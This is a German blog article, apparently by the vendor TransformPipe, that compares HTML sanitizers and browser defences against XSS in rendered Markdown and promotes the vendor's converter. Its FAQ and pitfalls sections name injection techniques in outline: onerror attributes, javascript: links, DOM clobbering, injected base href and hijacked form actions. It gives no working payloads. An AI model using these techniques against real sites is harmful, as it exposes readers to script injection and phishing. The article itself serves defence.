**Preis:** kostenlos, BSD-3-Clause-lizenziert.

**Technische Details und Funktionen**

- `UGCPolicy()` erlaubt eine breite Menge von Elementen für Nutzerinhalte und schließt iframes, objects, embeds, styles und scripts aus
- `StrictPolicy()` entfernt alle Elemente und Attribute
- Policies sind kombinierbar, Sie können also von einer Voreinstellung ausgehen und abziehen

**Wer sollte es verwenden?** Go-Dienste, die Markdown von Nutzern darstellen. Beginnen Sie mit `UGCPolicy()` und entfernen Sie dann, was Ihr Produkt nicht braucht.

### OWASP Java HTML Sanitizer — die Java-Antwort

Ein Java-Bereiniger mit einem expliziten Policy-Builder und ohne Laufzeitabhängigkeiten, gepflegt unter dem Dach von OWASP. Die `HtmlPolicyBuilder`-API lässt die Positivliste sich wie eine Spezifikation lesen, was nützlich ist, wenn die Positivliste eine Sicherheitsprüfung überleben muss.

| Vorteile | Nachteile |
| --- | --- |
| `HtmlPolicyBuilder` erzeugt eine lesbare, prüfbare Policy | Nur Java |
| Keine Laufzeitabhängigkeiten | Die vorgefertigten Policies sind eng, die meiste Arbeit ist also Ihre |
| Vorgefertigte `Sanitizers.FORMATTING` und `Sanitizers.LINKS`, kombinierbar | Eigener Parser, die Parser-Lücke gilt also |

**Preis:** kostenlos, doppelt lizenziert unter Apache 2.0 oder BSD-2-Clause.

**Wer sollte es verwenden?** JVM-Dienste. Die Builder-API ist der klarste Ausdruck von Positivlisten in jeder Sprache auf dieser Liste, was sie zu einer guten Sache macht, um sie jemandem zu zeigen, der noch nicht überzeugt ist.

### Ammonia — die Rust-Antwort und das Parser-Argument

Ammonia ist ein Positivlisten-HTML-Bereiniger in Rust, gebaut auf html5ever. Sein erklärter Ansatz ist, Dokumentfragmente genauso zu parsen und zu serialisieren, wie Browser es tun, was die Eigenschaft ist, die für einen serverseitigen Bereiniger am meisten zählt.

| Vorteile | Nachteile |
| --- | --- |
| html5ever parst so, wie Browser es tun, was die Parser-Lücke verengt | Nur Rust, sofern Sie es nicht über Bindungen nutzen |
| Positivlisten-basiert und schnell | Weniger fertige Policies als bei bluemonday |
| Außerdem die Maschine hinter nh3 für Python | Eine kompilierte Abhängigkeit in polyglotten Builds |

**Preis:** kostenlos, doppelt lizenziert unter MIT oder Apache 2.0.

**Wer sollte es verwenden?** Rust-Dienste und — über nh3 — Python-Dienste. Auch lesenswert, wenn Sie in irgendeiner Sprache einen Server-Bereiniger auswählen, denn seine Parser-Wahl ist das Argument, das Sie auf die anderen anwenden sollten.

### Loofah — die Ruby-Antwort

Loofah schrubbt HTML mit Nokogiri, mit Scrubbern, die Markup entfernen, beschneiden, maskieren oder weißwaschen. Rails' eigener HTML-Bereiniger ist darauf aufgebaut, die meisten Ruby-Anwendungen benutzen es also schon indirekt.

| Vorteile | Nachteile |
| --- | --- |
| Gebaut auf Nokogiri, einem gut erprobten HTML-Parser | Nur Ruby |
| Schon unter Rails' Bereiniger, es ist also im Feld gut getestet | Nokogiri ist eine native Abhängigkeit |
| Mehrere Schrubb-Strategien, nicht nur eine | Die Namen der Strategien brauchen einen Moment zum Lernen |

**Preis:** kostenlos, MIT-lizenziert.

**Wer sollte es verwenden?** Ruby- und Rails-Anwendungen. Wenn Sie Rails' `sanitize`-Helfer aufrufen, sind Sie schon hier; die Frage ist, ob die Positivliste Ihre ist oder die Voreinstellung des Frameworks.

### Content Security Policy — die Schicht, die ein Bereiniger nicht sein kann

Eine CSP ist kein Bereiniger und konkurriert nicht mit einem. Sie beantwortet eine andere Frage: was passiert, wenn der Bereiniger falsch liegt. Ein Bereiniger versucht zu garantieren, dass kein ausführbares Markup auf die Seite gelangt; eine CSP sagt dem Browser, Markup nicht auszuführen, unabhängig davon, wie es dorthin gekommen ist.

| Vorteile | Nachteile |
| --- | --- |
| Wirkt auf den Fehler, den Sie noch nicht gefunden haben | Kein Ersatz für das Bereinigen; sie entfernt nichts |
| `script-src 'none'` ist absolut auf einer Seite ohne eigene Skripte | Eine Anwendungsseite, die ihr eigenes JavaScript ausführt, kann `'none'` nicht verwenden |
| `base-uri 'none'` und `frame-ancestors 'none'` schließen Vektoren, die keine Positivliste abdeckt | Eine Policy nachträglich in eine bestehende Anwendung einzubauen ist echte Arbeit |
| Reporting-Endpunkte machen aus versuchten Injektionen Telemetrie | `frame-ancestors` und `sandbox` werden in einem `<meta>`-Tag ignoriert |

**Preis:** kostenlos, ein von Browsern implementierter Webstandard.

**Technische Details und Funktionen**

- `script-src 'none'` auf einer Seite, deren einzige Aufgabe das Anzeigen von Dokumenten ist
- `base-uri 'none'` neutralisiert ein eingeschleustes `<base href>`, was keine Tag-Positivliste ausdrücken kann
- `frame-ancestors 'none'` verhindert, dass Ihr Dokument in der Seite eines anderen geframt wird
- `img-src` und `connect-src` begrenzen, wohin ein überlebendes Element eine Anfrage senden kann
- Ausgeliefert als Response-Header oder als `<meta http-equiv>`-Tag, wobei die meta-Form `frame-ancestors`, `report-uri` und `sandbox` ignoriert

**Wer sollte es verwenden?** Jede Seite, die das Dokument eines anderen darstellt. Der Kompromiss ist echt: eine Seite, die ihr eigenes JavaScript ausführt, kann `script-src 'none'` nicht verwenden, was dafür spricht, nicht vertrauenswürdige Dokumente auf einer eigenen Route darzustellen. Ein von TransformPipe [als Link geteiltes](/blog/share-a-markdown-document-as-a-link) Dokument wird so ausgeliefert, und die Datei, die Sie herunterladen, hat überhaupt keine Skripte.

### Ein Iframe mit Sandbox — Isolation, wenn Filtern nicht genügt

Manchmal muss das Dokument Markup behalten, das Sie nicht sicher erlauben können — ein interner Bericht mit eigenen Styles, eine dargestellte E-Mail, die Ausgabe eines Systems, das Sie nicht kontrollieren. Stellen Sie es in einem Iframe mit einem `sandbox`-Attribut dar, und es läuft in einem opaken Origin ohne Zugriff auf Ihre Seite.

| Vorteile | Nachteile |
| --- | --- |
| Isolation statt Filtern, Lücken in der Positivliste zählen also weniger | Das Layout ist jetzt Ihre Sache: Größe, Scrollen, Drucken |
| `sandbox` ohne `allow-same-origin` bedeutet keinen Zugriff auf Ihren Speicher oder Ihr DOM | `allow-scripts` und `allow-same-origin` zusammen hebeln das Ganze aus |
| Kombiniert sich mit einer CSP, statt mit ihr zu konkurrieren | Links, Fokus und Barrierefreiheit brauchen alle bewusste Verdrahtung |

**Preis:** kostenlos, Teil von HTML.

**Wer sollte es verwenden?** Jeder, der Dokumente anzeigt, deren Markup unversehrt überleben muss. Verwenden Sie es *mit* einem Bereiniger, nicht anstelle eines — eine Sandbox verhindert, dass ein Skript Ihre Seite erreicht, und tut nichts gegen ein Dokument, das den Leser innerhalb des Frames phisht.

### TransformPipe — ein Konverter, der diese Entscheidungen schon getroffen hat

TransformPipe konvertiert Markdown in Ihrem Browser in ein vollständiges, eigenständiges HTML-Dokument. Der hier relevante Teil ist, dass das Bereinigen keine Option ist, die man vergessen kann einzuschalten: rohes HTML in der Quelle passiert eine Positivliste auf dem Weg zur Seite und auf dem Weg in die exportierte Datei.

| Vorteile | Nachteile |
| --- | --- |
| Eine Positivliste, angewandt von DOMPurify im Browser und `xss` auf dem Server | Die Positivliste ist fest: keine eigene Policy |
| Überschriften-IDs bekommen ein Präfix, erzeugte Anker können also keine Globals überdecken | Ein Dokument auf einmal, keine Build-Pipeline |
| Abgemeldet wird nichts hochgeladen — die Datei wird lokal gelesen und konvertiert | Der Browser macht die Arbeit, eine sehr große Datei hängt also von der Maschine ab |
| Der Export ist eine einzige Datei ohne externe Anfragen jeder Art | Keine Bibliothek: es konvertiert, es bettet sich nicht in Ihre Anwendung ein |

**Preis:** kostenlos. Ein Konto bringt Verlauf, Freigaben und eine API, ebenfalls kostenlos.

**Technische Details und Funktionen**

- Bereinigt das dargestellte HTML, nicht die Markdown-Quelle
- Dieselbe Positivliste auf beiden Seiten der Netzwerkgrenze, die zwei können also nicht auseinanderdriften
- Überschriften-IDs mit `doc-` als Präfix, was die von Hand angewandte Verteidigung gegen DOM-Clobbering ist
- Dieselbe Konvertierung aus einer REST-API, einem CLI, einer GitHub Action und einem MCP-Server

**Wer sollte es verwenden?** Jeder mit einer `.md`-Datei von anderswo und einer Person, an die er sie schicken will. Modellausgabe ist der häufige Fall: [sie in eine Seite zu verwandeln, die jemand lesen kann](/blog/ai-output-to-a-shareable-page), heißt, eine Zeichenkette darzustellen, die Sie nicht geschrieben haben, was genau das Problem ist, das dieser Text beschreibt.

## Wo die naheliegende Wahl scheitert

DOMPurify ist die richtige Voreinstellung, und der ehrliche Abschnitt handelt von seinen Grenzen, denn „wir verwenden DOMPurify" ist die Stelle, an der viele Sicherheitsprüfungen aufhören.

**Es braucht ein DOM, und ein gefälschtes scheitert offen.** Auf einem Server liefern Sie entweder jsdom aus oder verwenden eine andere Bibliothek. Bekommt DOMPurify eine Umgebung, in der es nicht arbeiten kann, gibt es seine Eingabe unverändert zurück, statt einen Fehler zu werfen, was der schlechteste verfügbare Fehlerfall ist: eine defekte und eine funktionierende Konfiguration erzeugen für jedes Dokument ohne HTML identische Ausgabe. Der Preis dafür, das nicht zu testen, ist ein Dienst, der nie etwas bereinigt hat und keine Möglichkeit hat, es zu erfahren.

**Die Voreinstellungen sind breit, und die gefährliche Voreinstellung ist aus.** DOMPurifys Positivliste ab Werk ist darauf ausgelegt, allgemein nützlich zu sein, nicht minimal für Ihr Produkt, und `SANITIZE_NAMED_PROPS` — die Option, die DOM-Clobbering tatsächlich stoppt — ist aus, sofern Sie sie nicht einschalten. Keines von beiden ist eine Kritik an der Bibliothek; beides ist eine Kritik daran, sie zu installieren und weiterzugehen.

**Ein Bereiniger kann Ihre Globals nicht kennen.** `id="config"`, `id="state"`, `id="init"` — welche Namen Ihr eigener Code auf `window` auch anfasst — sind für ihn unsichtbar, denn kein Bereiniger liest Ihr Bundle. Jeder überlebenden ID ein Präfix zu geben ist die einzige Verteidigung, die skaliert, denn sie hört auf, von einer Liste von Namen abzuhängen, die jemand pflegen muss.

**Sauber ist nicht dasselbe wie harmlos.** Eine Positivliste, die `<a href="https://...">` und `<img src="https://...">` erlaubt, erlaubt eine Seite, die genau wie Ihr Login-Bildschirm aussieht, und ein Bild, dessen Laden einem Dritten mitteilt, wann ein Dokument geöffnet wurde. Keines von beiden führt ein Skript aus und keines von beiden ist ein XSS-Fehler. Wenn Ihr Bedrohungsmodell Phishing oder Lesebestätigungen enthält, ist der Bereiniger nicht die Kontrolle, die Sie brauchen — `img-src` in einer CSP kommt näher, und eine Zwischenseite bei ausgehenden Links noch näher.

**Alles danach erbt das Risiko und nichts von der Garantie.** Der Highlighter, der Anker-Injektor, die umhüllende Vorlage, der reguläre Ausdruck „einfach `target=_blank` hinzufügen": jedes davon ist eine Stelle, an der bereinigtes HTML zu unbereinigtem HTML wird, ohne sichtbare Änderung an dem Code, der den Bereiniger aufruft. Das ist der häufigste Weg, auf dem ein korrekter Bereiniger in einem Vorfallbericht landet.

**Der Server kann keinen Header auf eine Datei setzen.** Eine CSP ist eine Eigenschaft einer Antwort, und eine heruntergeladene `.html`-Datei ist keine Antwort. Von der Festplatte geöffnet hat sie keine Header, die einzige Policy, die sie tragen kann, ist also ein `<meta http-equiv>`-Tag — das für `script-src` und `img-src` funktioniert und für `frame-ancestors` und `sandbox` ignoriert wird. Daher das Argument für einen Export, in dem überhaupt keine Skripte stehen: ein Dokument ohne Ausführbares ist selbst auf `file://` sicher, wo ein Header es nicht erreichen kann.

## Ein Dokument bereinigen, das Sie gleich jemand anderem in die Hand geben

Das meiste Geschriebene über Markdown-XSS setzt eine Webanwendung voraus: Ihre Seite, Ihr Origin, Ihre Sitzung. Eine Datei zu konvertieren ist eine andere Situation mit einem anderen Satz von Pflichten.

Wenn Sie nicht vertrauenswürdiges Markdown in Ihrer Anwendung darstellen, schützen Sie Ihre Nutzer vor einem Dokument. Wenn Sie eine Markdown-Datei konvertieren und das HTML an einen Kollegen schicken, schützen Sie *ihn* vor einem Dokument — einem, das mit Ihrem Namen darauf ankommt, von einer Adresse, der er vertraut, vorbei an dem, was seine Organisation auch mit Anhängen von Fremden macht. Ein `<script>`, das Ihre Konvertierung überlebt, ist gewaschen worden.

Daraus folgen drei Dinge. Bereinigen Sie bei der Konvertierung, auch wenn die Datei „nur ein Dokument" ist, denn der Browser des Empfängers wird das, was Sie schicken, genauso bereitwillig ausführen wie Ihrer. Bevorzugen Sie einen Export ohne jegliche Skripte gegenüber einem mit sicheren Skripten, denn weder der Empfänger noch sein Mail-Gateway kann den Unterschied prüfen. Und halten Sie die Datei eigenständig, was genauso eine Sicherheitseigenschaft ist wie eine Bequemlichkeit: ein Dokument, das nichts aus dem Netz anfordert, kann nicht zurückmelden, wann es gelesen wurde, und kann sich nicht ändern, nachdem Sie es geschickt haben.

Testen Sie dann Ihre eigene Pipeline mit drei Eingaben: einem `onerror`-Attribut, einem `javascript:`-Link und einer `id`, die zu einem Global passt, das Ihr Code liest. Wenn eines der ersten beiden die Seite erreicht, haben Sie einen Bereiniger hinzuzufügen und wahrscheinlich einen Header zu setzen. Das dritte wird sie erreichen, und das ist der Punkt — prüfen Sie, dass es unter einem Präfix ankommt und nicht unter dem Namen, den Ihr Code liest. Wenn Sie einen Konverter auswählen, statt einen zu bauen, ist [was jedes Werkzeug in der Bereinigungsstufe tut](/blog/best-markdown-to-html-converters) die Spalte, die zählt, und mehrere gut beleumundete Werkzeuge lassen rohes HTML absichtlich durch.

## Wie Sie wählen

1. **Fragen Sie, ob rohes HTML eine Funktion ist, die Sie tatsächlich anbieten.** Wenn nicht, maskieren Sie es und hören Sie auf: `html: false` in `markdown-it` kostet nichts in der Pflege und kann nicht umgangen werden, und die Alternative ist eine Positivliste, die Sie in drei Jahren immer noch besitzen.
2. **Wählen Sie den Bereiniger, der dort läuft, wo das HTML dargestellt wird, und testen Sie dann, dass er scheitert.** In einem Browser verwendet DOMPurify den Parser, der das Ergebnis darstellen wird, und schließt damit die Mutations-XSS-Lücke; auf einem Server bringt jede Option ihren eigenen Parser mit, wählen Sie also eine, die auf Browser-Genauigkeit zielt — und sichern Sie in Ihrer Testsuite zu, dass ein `<script>`-Tag in der Produktionskonfiguration entfernt wird, denn ein falsch konfiguriertes DOM scheitert stillschweigend offen.
3. **Schreiben Sie eine Positivliste und importieren Sie sie überall.** Zwei unabhängig konfigurierte Bereiniger werden auseinanderlaufen, und an dem Tag, an dem sie es tun, liegt das Dokument, das in Ihrer Anwendung sicher dargestellt wird, mit einem `<iframe>` darin gespeichert, damit der nächste Verbraucher es findet.
4. **Setzen Sie den Bereiniger nach den Renderer und nach jede Transformation, und geben Sie jeder ID, die er behält, ein Präfix.** Alles, was die HTML-Zeichenkette danach bearbeitet, sitzt außerhalb der Garantie des Bereinigers, und DOM-Clobbering braucht überhaupt kein Skript, ein Präfix an überlebenden IDs — einschließlich derer, die Ihre Überschriften-Anker erzeugen — ist also eine einzeilige Änderung, die eine ganze Fehlerklasse beendet.
5. **Fügen Sie den Header hinzu, den Sie brauchen würden, wenn der Bereiniger falsch läge.** `script-src 'none'`, `base-uri 'none'` und `frame-ancestors 'none'` auf einer Route zum Anzeigen von Dokumenten machen aus einer erfolgreichen Injektion eine blockierte Anfrage; wenn Sie sie nicht verwenden können, weil die Seite Ihre Anwendung ausführt, ist das der Grund, das Darstellen von Dokumenten auf eine eigene Route zu verlegen.

## Fazit

Markdown erlaubt rohes HTML, weil es so entworfen wurde, und keine Sorgfalt in einem Parser ändert das; die Sicherheit eines dargestellten Markdown-Dokuments ist eine Eigenschaft dessen, was Sie nach dem Rendern tun. Das heißt: eine schriftlich festgehaltene Positivliste, angewandt auf das dargestellte HTML, dieselbe Positivliste im Browser und auf dem Server, jede überlebende ID mit Präfix, nichts, was die Zeichenkette danach bearbeitet, und eine Content Security Policy, die für den Fehler, den Sie nicht gefunden haben, hinter allem steht. Wenn Sie diesen Code für eine Datei, die Sie nur konvertieren und schicken müssen, lieber nicht selbst besitzen wollen: [die Markdown-zu-HTML-Konvertierung eines Konverters, der standardmäßig bereinigt](/) wendet diese Schritte in Ihrem Browser an — eine Positivliste, Überschriften-IDs mit Präfix, ein Export ohne Skripte und ohne Netzwerkanfragen, kostenlos, und abgemeldet wird nichts hochgeladen.

## FAQ

### Ist Markdown anfällig für XSS?

Markdown selbst ist ein Textformat, aber fast jeder Markdown-Renderer lässt rohes HTML in die Ausgabe durch, was heißt, dass eine `.md`-Datei `<script>`, `onerror=` und `javascript:`-URLs direkt an den Browser tragen kann. Die Schwachstelle liegt in der Rendering-Pipeline, nicht im Format. Jede Pipeline, die Markdown darstellt, das Sie nicht geschrieben haben, braucht einen Bereiniger zwischen dem Renderer und der Seite.

### Macht DOMPurify Markdown allein sicher?

Es entfernt das ausführbare Markup, was der größte Teil der Arbeit ist, und es lässt drei Lücken. Sein Schutz gegen DOM-Clobbering ist nur mit eingeschaltetem `SANITIZE_NAMED_PROPS` vollständig, es kann nicht wissen, welche Globals Ihr eigener Code liest, und alles, was die HTML-Zeichenkette nach seinem Lauf bearbeitet, liegt außerhalb seiner Garantie. Kombinieren Sie es mit einer Content Security Policy und behandeln Sie seine Ausgabe als endgültig.

### Soll ich das Markdown oder das HTML bereinigen?

Das HTML, immer, und erst nachdem jede Transformation gelaufen ist. Markdown hat mehrere Schreibweisen für dieselbe Ausgabe, und der Renderer erfindet Markup, das in der Quelle nie stand — ein Autolink wird zu einem vollständigen Anker, eine Überschrift wird zu einer ID —, ein Filter auf der Quelle prüft also eine Zeichenkette, die nicht das ist, was ausgeliefert wird.

### Genügt es, HTML zu maskieren, statt es zu bereinigen?

Wenn Ihre Nutzer HTML nicht schreiben müssen, ist Maskieren besser als Bereinigen: es erzeugt Text, es gibt also nichts zu umgehen und keine Positivliste zu pflegen. `markdown-it` tut das standardmäßig mit `html: false`. In dem Moment, in dem jemand einen `<details>`-Block oder eine eingebettete Tabelle braucht, sind Sie wieder bei einer Positivliste.

### Wovor schützt eine Content Security Policy, wovor ein Bereiniger nicht schützt?

Vor dem Fehler in Ihrem Bereiniger. Ein Bereiniger entfernt Markup, das er als gefährlich erkennt; eine CSP sagt dem Browser, überhaupt keine Skripte auszuführen, was auch dann hält, wenn etwas durchgekommen ist. Sie schließt außerdem Vektoren, die eine Positivliste nicht ausdrücken kann, etwa ein eingeschleustes `<base href>` — dafür braucht es `base-uri 'none'`.

### Kann rohes HTML in Markdown ohne jedes JavaScript Schaden anrichten?

Ja, und das ist der Teil, den Leute verpassen. Ein `id`-Attribut überdeckt ein Global, ein `<base href>` richtet jeden relativen Link auf der Seite um, ein `<form action>` schickt die Eingabe des Lesers anderswohin, `position: fixed` in einem `style`-Attribut bedeckt Ihre Oberfläche mit der von jemand anderem, und ein entferntes `<img src>` meldet, wann Ihr Dokument gelesen wurde. Keines davon braucht ein Skript-Tag.

### Eine `.md`-Datei kam von jemandem, den ich nicht kenne — ist das konvertierte HTML sicher zu öffnen?

Nur mit einem Konverter, der bereinigt, und es lohnt sich zu wissen, mit welchem. Mehrere weit verbreitete Konverter lassen rohes HTML absichtlich durch und sagen es in ihrer Dokumentation, das `<script>` in der Datei wird also zu einem `<script>` im HTML, das Sie öffnen. Prüfen Sie das Verhalten des Werkzeugs, bevor Sie auf die Ausgabe doppelklicken, und denken Sie daran: wenn Sie dieses HTML weiterleiten, kommt es jetzt von Ihnen.
